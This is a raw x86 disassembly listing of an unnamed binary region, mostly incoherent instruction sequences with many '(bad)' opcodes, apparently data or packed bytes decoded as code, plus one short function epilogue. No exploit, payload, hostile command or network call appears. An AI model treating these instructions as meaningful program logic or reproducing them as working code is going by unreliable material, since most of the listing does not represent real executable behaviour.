  41c63f:	iret   
  41c640:	pop    eax
  41c641:	and    dl,bh
  41c643:	hlt    
  41c644:	sub    eax,DWORD PTR [edi+0x1e1ee5c]
  41c64a:	cmp    DWORD PTR [ebp+0x35516c56],esi
  41c650:	xor    esp,DWORD PTR [ebx-0x57]
  41c653:	loopne 0x41c641
  41c655:	fbld   TBYTE PTR [eax+eax*4-0xe2515fa]
  41c65c:	or     bl,cl
  41c65e:	ret    0x84bf
  41c661:	xor    DWORD PTR [ecx-0x6d3760c7],0xffffffd1
  41c668:	xchg   BYTE PTR [ebx],dl
  41c66a:	jb     0x41c694
  41c66c:	in     al,dx
  41c66d:	sbb    DWORD PTR [ecx],eax
  41c66f:	xchg   eax,ebx
  41c671:	data16 ja 0x41c680
  41c674:	xchg   dx,ax
  41c676:	ins    DWORD PTR es:[edi],dx
  41c677:	lock ret 
  41c679:	mov    esi,0x952a1859
  41c67e:	arpl   WORD PTR [eax],cx
  41c680:	ja     0x41c674
  41c682:	cmp    DWORD PTR [esp+ebp*1],eax
  41c685:	mov    esp,0x74735d81
  41c68a:	cwde   
  41c68b:	push   es
  41c68c:	xchg   edx,eax
  41c68d:	cmp    esp,ebx
  41c68f:	jb     0x41c61f
  41c691:	or     eax,0x63bea831
  41c696:	inc    eax
  41c697:	addr16 mov edx,0xe5224777
  41c69d:	and    BYTE PTR [edi-0x40590d75],dh
  41c6a3:	inc    esi
  41c6a4:	out    0x6c,al
  41c6a6:	sub    eax,0x23f23bab
  41c6ab:	shl    BYTE PTR [ebx+ebx*8],0x49
  41c6af:	sub    al,0x7b
  41c6b1:	dec    esp
  41c6b2:	jo     0x41c715
  41c6b4:	mov    esp,0xe8aacd83
  41c6b9:	jle    0x41c684
  41c6bb:	inc    edx
  41c6bc:	mov    edx,0x65d9244e
  41c6c1:	test   DWORD PTR [eax],ecx
  41c6c3:	lods   al,BYTE PTR ds:[esi]
  41c6c4:	lds    ecx,FWORD PTR [ebp-0x73]
  41c6c7:	jbe    0x41c672
  41c6c9:	es loopne 0x41c664
  41c6cc:	in     eax,0xcb
  41c6ce:	jle    0x41c6b3
  41c6d0:	push   cs
  41c6d1:	dec    esi
  41c6d2:	sub    edx,edx
  41c6d4:	push   es
  41c6d5:	call   0xbe3b:0x2fb43c50
  41c6dc:	or     al,0xbc
  41c6de:	mov    ebp,0xc7b8188c
  41c6e3:	or     DWORD PTR [ebx-0x49],ebp
  41c6e6:	les    ebp,FWORD PTR [edi+edi*8+0x41]
  41c6ea:	lock jg 0x41c68e
  41c6ed:	scas   eax,DWORD PTR es:[edi]
  41c6ee:	jg     0x41c70f
  41c6f0:	xor    bh,BYTE PTR [ebx+edi*8+0x9]
  41c6f4:	and    al,0x44
  41c6f6:	(bad)  
  41c6f8:	cmp    ebx,ebp
  41c6fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6fb:	mov    dl,0x3a
  41c6fd:	fbld   TBYTE PTR [edx+0x2b9a030f]
  41c703:	or     eax,0x3c963e3c
  41c708:	dec    eax
  41c709:	popa   
  41c70a:	xchg   esi,eax
  41c70b:	xor    ah,BYTE PTR [esi+edi*8+0x404b06b0]
  41c712:	mul    BYTE PTR [eax]
  41c714:	push   es
  41c715:	jmp    0xc620e49b
  41c71a:	stos   DWORD PTR es:[edi],eax
  41c71b:	sbb    BYTE PTR fs:[ebx+eiz*1-0x6b3882a9],dh
  41c723:	iret   
  41c724:	push   edi
  41c725:	dec    esi
  41c726:	retf   0xab39
  41c729:	or     DWORD PTR [edi+0x72d6c97],0xffffffd5
  41c730:	xchg   ebx,eax
  41c731:	mov    ecx,0x9d97138c
  41c736:	mov    eax,0xfd7f9712
  41c73b:	mul    DWORD PTR [eax]
  41c73d:	mov    edi,0xac711a43
  41c742:	or     DWORD PTR [ebp-0x638d834],0xa83ac883
  41c74c:	mov    ds:0x6d69b052,eax
  41c751:	test   BYTE PTR [ebx+0x42c2b2cb],cl
  41c757:	aas    
  41c758:	jge    0x41c7d8
  41c75a:	fnstsw WORD PTR [edx-0x7a0db1fb]
  41c760:	fisub  WORD PTR [ebx+0xc]
  41c763:	push   ebp
  41c764:	(bad)  
  41c765:	jns    0x41c774
  41c767:	mov    bh,0x4a
  41c769:	mov    ch,0xb3
  41c76b:	fst    st(4)
  41c76d:	sub    esp,0xffffffcb
  41c770:	dec    ebx
  41c771:	enter  0x5cb1,0xd5
  41c775:	fwait
  41c776:	or     ecx,DWORD PTR [esi+0x1]
  41c779:	rcr    BYTE PTR [ebx+0x37a91de4],cl
  41c77f:	mov    al,0x19
  41c781:	imul   edi,DWORD PTR [esi-0xd],0xffffff91
  41c785:	out    0xc2,eax
  41c787:	mov    ch,0x36
  41c789:	clc    
  41c78a:	daa    
  41c78b:	xchg   esp,eax
  41c78c:	(bad)  
  41c78d:	jnp    0x41c772
  41c78f:	clc    
  41c790:	loopne 0x41c7fe
  41c792:	ja     0x41c7b5
  41c794:	(bad)  
  41c796:	test   eax,0xe8756062
  41c79b:	xlat   BYTE PTR ds:[ebx]
  41c79c:	jae    0x41c7f8
  41c79e:	scas   al,BYTE PTR es:[edi]
  41c79f:	out    dx,eax
  41c7a0:	pushf  
  41c7a1:	mov    DWORD PTR [edi+0x5f65e8bf],ebp
  41c7a7:	push   cs
  41c7a8:	jb     0x41c7b2
  41c7aa:	rcr    BYTE PTR [edi-0x39],1
  41c7ad:	push   eax
  41c7ae:	mov    ds:0x682136d1,eax
  41c7b3:	mov    al,0xdc
  41c7b5:	lea    ebp,[ebp+0x7e153a53]
  41c7bb:	lea    edx,[eax+0x25565c3c]
  41c7c1:	shl    DWORD PTR [esi+0x59],1
  41c7c4:	sub    ah,BYTE PTR [ebp+0x201b61cd]
  41c7ca:	add    BYTE PTR [edx-0x67ebdb4a],cl
  41c7d0:	adc    al,BYTE PTR [eax+0x1c706224]
  41c7d6:	mov    eax,0x542efd7c
  41c7db:	and    eax,0xbcbf3c41
  41c7e0:	push   esi
  41c7e1:	xchg   ebx,edi
  41c7e3:	pop    edi
  41c7e4:	push   es
  41c7e5:	dec    DWORD PTR [eax]
  41c7e7:	or     BYTE PTR ss:[eax],dh
  41c7ea:	inc    edx
  41c7eb:	bound  esi,QWORD PTR [ecx+0x6d7353d2]
  41c7f1:	mov    WORD PTR [ecx-0x46],?
  41c7f4:	ror    BYTE PTR [ebx],1
  41c7f6:	inc    ebp
  41c7f7:	dec    ecx
  41c7f8:	mov    ds:0x30bb7dfd,al
  41c7fd:	and    ax,0xdee6
  41c801:	(bad)  
  41c802:	add    edx,DWORD PTR [edi+ecx*2+0x52a5af96]
  41c809:	push   edi
  41c80a:	lds    esi,FWORD PTR [esi+eiz*2]
  41c80d:	sahf   
  41c80e:	mov    ch,0x7f
  41c810:	push   cs
  41c811:	adc    al,0x89
  41c813:	cdq    
  41c814:	mov    bh,0x70
  41c816:	cli    
  41c817:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41c819:	fmul   DWORD PTR [ebp-0x6a8992fc]
  41c81f:	add    al,0x10
  41c821:	inc    ebx
  41c822:	lods   al,BYTE PTR ds:[esi]
  41c823:	xor    edx,0xb5055826
  41c829:	add    al,BYTE PTR [ecx+ecx*8+0x15]
  41c82d:	push   esi
  41c82e:	popa   
  41c82f:	sub    al,0x56
  41c831:	and    ecx,esi
  41c833:	shl    esp,1
  41c835:	jmp    0xbf874f76
  41c83a:	imul   BYTE PTR [edi-0x2ef9801a]
  41c840:	mul    BYTE PTR [ebx+ebx*4-0x71aebecd]
  41c847:	mov    BYTE PTR [eax],ah
  41c849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c84a:	sbb    cl,BYTE PTR ds:0xcb7264bc
  41c850:	stc    
  41c851:	push   ebx
  41c852:	xchg   BYTE PTR [ecx-0x64],al
  41c855:	cmp    DWORD PTR [eax+0x2d989edc],ebx
  41c85b:	or     DWORD PTR [esi+esi*8-0x67312e66],ecx
  41c862:	mov    eax,ds:0x8e58bbb0
  41c867:	xchg   ecx,eax
  41c868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c869:	scas   eax,DWORD PTR es:[edi]
  41c86a:	ds pop esp
  41c86c:	sub    esp,edi
  41c86e:	int    0x5c
  41c870:	ret    
  41c871:	scas   eax,DWORD PTR es:[edi]
  41c872:	jo     0x41c89d
  41c874:	sub    bh,BYTE PTR [ecx+0x7101dbef]
  41c87a:	mov    dl,0x6c
  41c87c:	cmp    edi,esi
  41c87e:	pop    esp
  41c87f:	jo     0x41c80e
  41c881:	in     al,0x4b
  41c883:	jne    0x41c904
  41c885:	popa   
  41c886:	cmp    ch,bl
  41c888:	lds    ebp,FWORD PTR [ebx-0x2d]
  41c88b:	pop    ecx
  41c88c:	push   es
  41c88d:	add    BYTE PTR [ebx+0x49289084],bh
  41c893:	inc    ecx
  41c894:	mov    dh,0xd5
  41c896:	lahf   
  41c897:	mov    ecx,0x13158087
  41c89c:	fscale 
  41c89e:	add    eax,ecx
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0x2f5a88e2
  41c8c2:	cwde   
  41c8c3:	shr    BYTE PTR [edi-0x55fffe7b],cl
  41c8c9:	add    BYTE PTR [eax],al
  41c8cb:	add    BYTE PTR [ebp+0x4e],cl
  41c8ce:	test   eax,0xfd37cdc7
  41c8d3:	dec    esp
  41c8d4:	in     al,0xd5
  41c8d6:	push   ebx
  41c8d7:	fimul  DWORD PTR [esi-0x4e4c4524]
  41c8dd:	cmp    al,0xfa
  41c8df:	jg     0x41c8e9
  41c8e1:	mov    bh,bh
  41c8e3:	je     0x41c87f
  41c8e5:	cmc    
  41c8e6:	add    al,0x89
  41c8e8:	sbb    bh,cl
  41c8ea:	jo     0x41c8eb
  41c8ec:	xchg   ebx,eax
  41c8ed:	out    0xff,eax
  41c8ef:	lods   al,BYTE PTR ds:[esi]
  41c8f0:	mov    al,0xb6
  41c8f2:	push   eax
  41c8f3:	or     eax,0x19972595
  41c8f8:	aas    
  41c8f9:	out    0x95,eax
  41c8fb:	add    ebx,ebp
  41c8fd:	in     eax,0x1e
  41c8ff:	or     eax,0x24b5d383
  41c904:	out    0xdf,al
  41c906:	ins    BYTE PTR es:[edi],dx
  41c907:	xor    esi,DWORD PTR fs:[edi]
  41c90a:	xor    ebx,esi
  41c90c:	jmp    0xbcec:0xde1dc4bb
  41c913:	in     eax,0xce
  41c915:	push   edi
  41c916:	xchg   DWORD PTR [ebp+0x55],ebp
  41c919:	in     eax,dx
  41c91a:	add    ebp,DWORD PTR [edx-0x4140ab1e]
  41c920:	jg     0x41c91d
  41c922:	cld    
  41c923:	(bad)  
  41c926:	add    dl,BYTE PTR [eax]
  41c928:	mov    BYTE PTR [edx],ch
  41c92a:	jnp    0x41c984
  41c92c:	jle    0x41c977
  41c92e:	push   esp
  41c92f:	pop    ds
  41c930:	imul   ebp,DWORD PTR [edx+esi*4+0x51],0xffffffad
  41c935:	or     al,0xe9
  41c937:	fld    DWORD PTR [ebx+0x55bc2331]
  41c93d:	push   ss
  41c93e:	add    BYTE PTR [ecx-0x447e8f4],0xdc
  41c945:	ret    
  41c946:	inc    BYTE PTR [ebp+0x24]
  41c949:	pop    ds
  41c94a:	jb     0x41c962
  41c94c:	hlt    
  41c94d:	jnp    0x41c967
  41c94f:	pop    esi
  41c950:	in     al,dx
  41c951:	sbb    ebx,ebx
  41c953:	mov    esi,0xef1bfd2b
  41c958:	pop    esi
  41c959:	jno    0x41c904
  41c95b:	push   edi
  41c95c:	cmp    eax,0xbb75f4c2
  41c961:	sbb    eax,0x2a1b5d61
  41c966:	dec    esp
  41c967:	cmc    
  41c968:	sub    cl,BYTE PTR [ecx+0xcb1770c]
  41c96e:	int3   
  41c96f:	inc    si
  41c971:	xchg   esp,eax
  41c972:	pop    ss
  41c973:	push   esi
  41c974:	jne    0x41c9cb
	...
  41c982:	add    BYTE PTR [eax],al
  41c984:	shr    DWORD PTR [esp+edx*1],1
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0xf05ae826
  41c994:	pop    ecx
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [edx-0x25000000],ch
  41c99d:	test   eax,0x52bf67b5
  41c9a2:	add    al,0x36
  41c9a4:	mov    esp,DWORD PTR [ecx-0x8]
  41c9a7:	enter  0x72e,0xec
  41c9ab:	dec    eax
  41c9ac:	in     al,dx
  41c9ad:	sub    ebp,DWORD PTR [edx+0x20]
  41c9b0:	cld    
  41c9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9b2:	loop   0x41ca23
  41c9b4:	jns    0x41c9a0
  41c9b6:	test   DWORD PTR [edi],ecx
  41c9b8:	je     0x41c99a
  41c9ba:	(bad)  [edi-0x21944df2]
  41c9c0:	mov    ah,0xa
  41c9c2:	cdq    
  41c9c3:	jecxz  0x41ca27
  41c9c5:	mov    ch,0x57
  41c9c7:	mov    al,ds:0x40eb9882
  41c9cc:	pop    edi
  41c9cd:	lock or al,0xc2
  41c9d0:	jb     0x41c962
  41c9d2:	jp     0x41c9c1
  41c9d4:	fadd   QWORD PTR [esi-0x77]
  41c9d7:	std    
  41c9d8:	xchg   edx,eax
  41c9d9:	adc    DWORD PTR [edi-0x63],edi
  41c9dc:	pushf  
  41c9dd:	cwde   
  41c9de:	retf   0x667e
  41c9e1:	xor    DWORD PTR [edi],esp
  41c9e3:	outs   dx,WORD PTR ds:[esi]
  41c9e5:	out    dx,eax
  41c9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e7:	icebp  
  41c9e8:	(bad)  
  41c9e9:	call   0x2875b8dc
  41c9ee:	ret    
  41c9ef:	sbb    DWORD PTR [edi-0x7320ca90],edi
  41c9f5:	and    BYTE PTR [ecx-0x3b0fea4c],ch
  41c9fb:	sub    esi,ebp
  41c9fd:	mov    esi,DWORD PTR [eax-0x34]
  41ca00:	test   dh,cl
  41ca02:	and    al,0x8f
  41ca04:	mov    eax,0x9b0d7a6f
  41ca09:	pop    esp
  41ca0a:	lahf   
  41ca0b:	dec    esp
  41ca0c:	mov    ds:0xf6b76f48,al
  41ca11:	(bad)  
  41ca12:	loopne 0x41ca1d
  41ca14:	mov    DWORD PTR [eax+0x2f0a85e4],edi
  41ca1a:	mov    ah,0x9
  41ca1c:	mov    WORD PTR [eax],ss
  41ca1e:	add    eax,0x59978cf5
  41ca23:	test   DWORD PTR [edi-0x31e99eb7],ebp
  41ca29:	mov    ch,0xf4
  41ca2b:	cld    
  41ca2c:	cmp    al,0xa6
  41ca2e:	lods   eax,DWORD PTR ds:[esi]
  41ca2f:	(bad)  
  41ca31:	and    BYTE PTR [ecx+eax*1+0x5f],ah
  41ca35:	xchg   BYTE PTR [edx-0x25fd5cbd],dh
  41ca3b:	or     al,0x19
  41ca3d:	xor    DWORD PTR [eax-0x538e25c2],ebx
  41ca43:	sahf   
  41ca44:	shl    BYTE PTR [eax+0x0],0x0
	...
  41ca53:	add    BYTE PTR [edi],bl
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2-0x5675d5fa],0x3
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [edx-0x1c000000],ch
  41ca6d:	jno    0x41cadf
  41ca6f:	dec    ebp
  41ca70:	js     0x41ca35
  41ca72:	mov    al,0x28
  41ca74:	adc    ch,BYTE PTR [edx+0x5f44ebb6]
  41ca7a:	adc    cl,BYTE PTR [esi-0x1a]
  41ca7d:	ins    BYTE PTR es:[edi],dx
  41ca7e:	inc    eax
  41ca7f:	outs   dx,BYTE PTR ds:[esi]
  41ca80:	ins    DWORD PTR es:[edi],dx
  41ca81:	aad    0xd9
  41ca83:	retf   
  41ca84:	aad    0x9d
  41ca86:	sahf   
  41ca87:	test   esp,eax
  41ca89:	jl     0x41cab2
  41ca8b:	in     eax,0x9a
  41ca8d:	loope  0x41caee
  41ca8f:	inc    edi
  41ca90:	inc    ebp
  41ca91:	mov    ch,0xfa
  41ca93:	pop    edi
  41ca94:	(bad)  
  41ca95:	cmp    BYTE PTR [eax-0x41],al
  41ca98:	(bad)  
  41ca99:	js     0x41ca25
  41ca9b:	pop    ebx
  41ca9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca9d:	cmp    dh,BYTE PTR [esi*8+0x535ea456]
  41caa4:	stos   BYTE PTR es:[edi],al
  41caa5:	xchg   edi,eax
  41caa6:	cmp    eax,0xc543a04b
  41caab:	lods   eax,DWORD PTR ds:[esi]
  41caac:	(bad)  
  41caae:	test   al,0x70
  41cab0:	ins    BYTE PTR es:[edi],dx
  41cab1:	inc    ecx
  41cab2:	mov    ecx,0xba91a722
  41cab7:	xor    eax,0xc9309f94
  41cabc:	mov    ecx,0x3c1c6c72
  41cac1:	inc    ebp
  41cac2:	addr16 not esp
  41cac5:	xchg   esp,eax
  41cac6:	jmp    0x557e6565
  41cacb:	fiadd  DWORD PTR [eax+0x7383b1c1]
  41cad1:	fstp   st(1)
  41cad3:	ret    0x615d
  41cad6:	test   BYTE PTR ds:0x490e3893,al
  41cadc:	iret   
  41cadd:	mov    edi,0x93771060
  41cae2:	jl     0x41cb36
  41cae4:	cmp    eax,eax
  41cae6:	fiadd  WORD PTR [ecx+0x2d7fc4ba]
  41caec:	dec    edi
  41caed:	pop    esi
  41caee:	(bad)  
  41caef:	sbb    ebp,DWORD PTR gs:[edx]
  41caf2:	push   eax
  41caf3:	and    BYTE PTR [eax+0x2d],0x87
  41caf7:	retf   
  41caf8:	jp     0x41cb1a
  41cafa:	in     al,0x4b
  41cafc:	push   0xa73ba192
  41cb01:	and    ebp,ebx
  41cb03:	test   al,0xb7
  41cb05:	test   DWORD PTR [edx],esp
  41cb07:	sbb    al,0x26
  41cb09:	sbb    DWORD PTR [ecx],0x4c
  41cb0c:	sub    DWORD PTR [ebp+0x3a],eax
  41cb0f:	cli    
  41cb10:	ret    
  41cb11:	lods   eax,DWORD PTR ds:[esi]
  41cb12:	mov    esi,0xf02ba9
	...
  41cb23:	add    BYTE PTR [edi],ch
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	rcr    BYTE PTR [eax+eiz*1+0x187adea],cl
  41cb37:	add    BYTE PTR [edx-0x43000000],ch
  41cb3d:	inc    bh
  41cb3f:	xchg   DWORD PTR [eax-0x44fbdcdd],esi
  41cb45:	cwde   
  41cb46:	cld    
  41cb47:	arpl   WORD PTR [esp+ebp*8],bx
  41cb4a:	stos   DWORD PTR es:[edi],eax
  41cb4b:	adc    dl,0x5a
  41cb4e:	out    dx,eax
  41cb4f:	pop    es
  41cb50:	xchg   esi,ecx
  41cb52:	stos   BYTE PTR es:[edi],al
  41cb53:	xor    ch,BYTE PTR [edx-0x7d716424]
  41cb59:	jb     0x41cb10
  41cb5b:	les    eax,FWORD PTR [eax-0x7f]
  41cb5e:	loop   0x41cae3
  41cb60:	sbb    eax,0x10b39b75
  41cb65:	gs and al,0xac
  41cb68:	test   al,0x7e
  41cb6a:	sub    al,BYTE PTR [esi-0x6b72e0c1]
  41cb70:	push   edi
  41cb71:	push   cs
  41cb72:	mov    ecx,0xfb0107a2
  41cb77:	pop    es
  41cb78:	xlat   BYTE PTR ds:[ebx]
  41cb79:	ret    0x6835
  41cb7c:	ffree  st(4)
  41cb7e:	xor    dh,bh
  41cb80:	xor    eax,0xaa3974c2
  41cb85:	inc    ebx
  41cb86:	mov    DWORD PTR ds:0x196b4201,esp
  41cb8c:	mov    dh,0x4b
  41cb8e:	xchg   ecx,eax
  41cb8f:	mov    DWORD PTR [ebx+ebp*8],ebx
  41cb92:	pop    es
  41cb93:	jae    0x41cc04
  41cb95:	add    DWORD PTR [edi-0x7c0d3056],0x60
  41cb9c:	nop
  41cb9d:	ins    BYTE PTR es:[edi],dx
  41cb9e:	pop    esp
  41cb9f:	(bad)  
  41cba0:	and    DWORD PTR [edx+0x6b],ebp
  41cba3:	dec    edi
  41cba4:	jae    0x41cb54
  41cba6:	pop    ebp
  41cba7:	lods   eax,DWORD PTR ds:[esi]
  41cba8:	pop    esp
  41cba9:	xor    DWORD PTR [eax],ecx
  41cbab:	cdq    
  41cbac:	adc    DWORD PTR [edi],esi
  41cbae:	inc    eax
  41cbaf:	jg     0x41cc1c
  41cbb1:	fiadd  DWORD PTR [ebx-0x5f]
  41cbb4:	xchg   BYTE PTR [ebp-0x3d6d3266],ah
  41cbba:	cmp    eax,0x270d9026
  41cbbf:	jp     0x41cbff
  41cbc1:	jge    0x41cc0e
  41cbc3:	or     cl,BYTE PTR [edi+0x28]
  41cbc6:	inc    esi
  41cbc7:	test   DWORD PTR [eax+0x18],eax
  41cbca:	adc    al,0x79
  41cbcc:	add    BYTE PTR [esi+0x18],0x8d
  41cbd0:	scas   al,BYTE PTR es:[edi]
  41cbd1:	pushf  
  41cbd2:	dec    eax
  41cbd3:	or     al,0x99
  41cbd5:	imul   edx,DWORD PTR [ebx-0x6505ad40],0x52
  41cbdc:	js     0x41cbe6
  41cbde:	sti    
  41cbdf:	inc    edi
  41cbe0:	popa   
  41cbe1:	xchg   edx,eax
  41cbe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbe3:	test   eax,0x5d
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    dl,cl
  41cbf5:	mov    al,ds:0xdf7e4d76
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0xc258eece,al
  41cc04:	push   edi
  41cc05:	mov    BYTE PTR [ecx],al
  41cc07:	add    BYTE PTR [edx+0xe000000],ch
  41cc0d:	mov    dl,0x86
  41cc0f:	fucomp st(0)
  41cc11:	out    dx,eax
  41cc12:	pop    edx
  41cc13:	out    dx,al
  41cc14:	imul   esi,DWORD PTR [edi],0xffffff99
  41cc17:	retf   
  41cc18:	add    edi,DWORD PTR [edx]
  41cc1a:	or     DWORD PTR [esi],edx
  41cc1c:	jmp    0xd25af0fa
  41cc21:	addr16 push edx
  41cc23:	pop    ds
  41cc24:	xor    DWORD PTR [edx+0x69],ebx
  41cc27:	test   al,0x36
  41cc29:	xor    DWORD PTR [esi-0xc],0x2bf62dd3
  41cc30:	in     al,0x48
  41cc32:	int3   
  41cc33:	rcr    DWORD PTR [edx+0x7fc08ba7],1
  41cc39:	adc    ebx,ecx
  41cc3b:	imul   ecx,edi,0xf682da21
  41cc41:	mov    eax,ds:0xc653ffd6
  41cc46:	pop    edx
  41cc47:	cwde   
  41cc48:	stos   BYTE PTR es:[edi],al
  41cc49:	push   0x4
  41cc4b:	fsub   QWORD PTR [ecx-0x7c]
  41cc4e:	pushw  es
  41cc50:	pop    esp
  41cc51:	pushf  
  41cc52:	(bad)  
  41cc53:	iret   
  41cc54:	lahf   
  41cc55:	push   ss
  41cc56:	sbb    esp,eax
  41cc58:	rcl    bh,0x84
  41cc5b:	inc    esp
  41cc5c:	jbe    0x41cc0d
  41cc5e:	dec    eax
  41cc5f:	outs   dx,BYTE PTR ds:[esi]
  41cc60:	addr16 xchg esi,eax
  41cc62:	dec    esi
  41cc63:	push   0x95ebddc8
  41cc68:	xlat   BYTE PTR ds:[ebx]
  41cc6a:	push   ecx
  41cc6b:	dec    ecx
  41cc6c:	sub    ecx,ecx
  41cc6e:	jne    0x41ccd4
  41cc70:	xor    bl,ch
  41cc72:	and    eax,0x36016ba2
  41cc77:	adc    ah,BYTE PTR ds:0x196a2832
  41cc7d:	mov    al,0x5e
  41cc7f:	call   0x1053:0x4c1f27f7
  41cc86:	push   cs
  41cc87:	xor    esi,esp
  41cc89:	in     eax,0x3c
  41cc8b:	or     eax,0xe76e6290
  41cc90:	adc    eax,ebx
  41cc92:	push   cs
  41cc93:	xor    al,0x45
  41cc95:	adc    ebp,DWORD PTR [ecx-0x4709f2f4]
  41cc9b:	ror    ebp,0x61
  41cc9e:	je     0x41cc66
  41cca0:	push   cs
  41cca1:	add    eax,0x7a6ede8f
  41cca6:	bound  edx,QWORD PTR [edx-0x80dc6aa]
  41ccac:	xchg   DWORD PTR [edi],esi
  41ccae:	pop    ds
  41ccaf:	pop    ss
  41ccb0:	mov    eax,0x1d51e665
  41ccb5:	xor    DWORD PTR [eax],eax
	...
  41ccc3:	add    dh,al
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	push   es
  41ccd1:	adc    bl,BYTE PTR [edi]
  41ccd3:	mov    ds:0x18901,eax
  41ccd8:	stos   BYTE PTR es:[edi],al
  41ccd9:	add    BYTE PTR [eax],al
  41ccdb:	add    cl,ch
  41ccdd:	inc    edi
  41ccde:	xor    al,0x4d
  41cce0:	std    
  41cce1:	sub    al,al
  41cce3:	sahf   
  41cce4:	imul   esi,DWORD PTR [edx-0x2140bde5],0x2c
  41cceb:	sar    ebp,0x88
  41ccee:	rcl    DWORD PTR [edx],1
  41ccf0:	jmp    0x8e54d856
  41ccf5:	cld    
  41ccf6:	ds jne 0x41ccc7
  41ccf9:	iret   
  41ccfa:	jo     0x41ccf5
  41ccfc:	dec    ebx
  41ccfd:	loop   0x41ccb8
  41ccff:	mov    ds:0xce5b38f9,eax
  41cd04:	dec    eax
  41cd05:	push   0xffffff83
  41cd07:	mov    BYTE PTR [ebx+0x31655aca],bh
  41cd0d:	pop    eax
  41cd0e:	rol    ah,cl
  41cd10:	mov    bh,0xe2
  41cd12:	pop    ebp
  41cd13:	dec    esi
  41cd14:	adc    al,0x90
  41cd16:	rol    ebx,1
  41cd18:	pop    ds
  41cd19:	(bad)  [edx-0x9]
  41cd1c:	(bad)  
  41cd1e:	scas   al,BYTE PTR es:[edi]
  41cd1f:	rcr    BYTE PTR [esi+0x36],1
  41cd22:	dec    eax
  41cd23:	ja     0x41cd6f
  41cd25:	adc    al,BYTE PTR [ecx+0x1b86e88d]
  41cd2b:	imul   eax,ebx,0xd1a5fd5f
  41cd31:	and    al,0xa9
  41cd33:	neg    DWORD PTR [esi+0xa1efc87]
  41cd39:	into   
  41cd3a:	mov    ecx,0x104e896d
  41cd3f:	dec    ecx
  41cd40:	arpl   WORD PTR [ecx+ebx*2-0x6b],di
  41cd44:	sub    ebp,ebx
  41cd46:	ss sbb eax,0xbbfbb417
  41cd4c:	shl    DWORD PTR [ecx+0x73739a4c],cl
  41cd52:	xacquire xchg DWORD PTR [edx+0x56],ebp
  41cd56:	push   edx
  41cd57:	icebp  
  41cd58:	pop    ecx
  41cd59:	cdq    
  41cd5a:	scas   eax,DWORD PTR es:[edi]
  41cd5b:	test   BYTE PTR [ecx],0xf
  41cd5e:	nop
  41cd5f:	mov    bh,0xe1
  41cd61:	and    edx,edi
  41cd63:	dec    ecx
  41cd64:	mov    ebp,esp
  41cd66:	bound  eax,QWORD PTR ss:[esi+0x50]
  41cd6a:	aad    0xe8
  41cd6c:	mov    edx,0xc5962657
  41cd71:	push   es
  41cd72:	mov    al,bl
  41cd74:	cli    
  41cd75:	adc    al,0x4e
  41cd77:	xchg   ebp,eax
  41cd78:	(bad)  
  41cd79:	fsubr  DWORD PTR [edi]
  41cd7b:	pusha  
  41cd7c:	int3   
  41cd7d:	jno    0x41cd10
  41cd7f:	call   FWORD PTR [eax+0x48dee5e9]
  41cd85:	pop    ecx
	...
  41cd92:	add    BYTE PTR [eax],al
  41cd94:	push   edx
  41cd95:	xor    al,0x40
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0x7c6a4e09
  41cda1:	fist   WORD PTR [eax+0x189ab1e]
  41cda7:	add    BYTE PTR [edx-0x62000000],ch
  41cdad:	jbe    0x41cdc4
  41cdaf:	add    DWORD PTR [edi+0x16],ebp
  41cdb2:	jle    0x41cdc7
  41cdb4:	loop   0x41ce08
  41cdb6:	imul   edi,DWORD PTR [ebp-0x6b],0x8
  41cdba:	mov    BYTE PTR ds:0x41a4bfe0,cl
  41cdc0:	push   ebp
  41cdc1:	arpl   WORD PTR [eax],bp
  41cdc3:	xchg   ebp,eax
  41cdc4:	fadd   QWORD PTR [esi-0x10]
  41cdc7:	lods   al,BYTE PTR ds:[esi]
  41cdc8:	fnstcw WORD PTR [esi]
  41cdca:	or     eax,0x1075e09f
  41cdcf:	and    BYTE PTR [esi],cl
  41cdd1:	sbb    dh,BYTE PTR [esp+eiz*8-0x5c3bc552]
  41cdd8:	push   0xbd621074
  41cddd:	and    al,0x6c
  41cddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cde0:	(bad)  
  41cde1:	adc    al,0x5c
  41cde3:	inc    esp
  41cde4:	push   ebx
  41cde5:	adc    BYTE PTR [eax+0x20],bh
  41cde8:	adc    ch,al
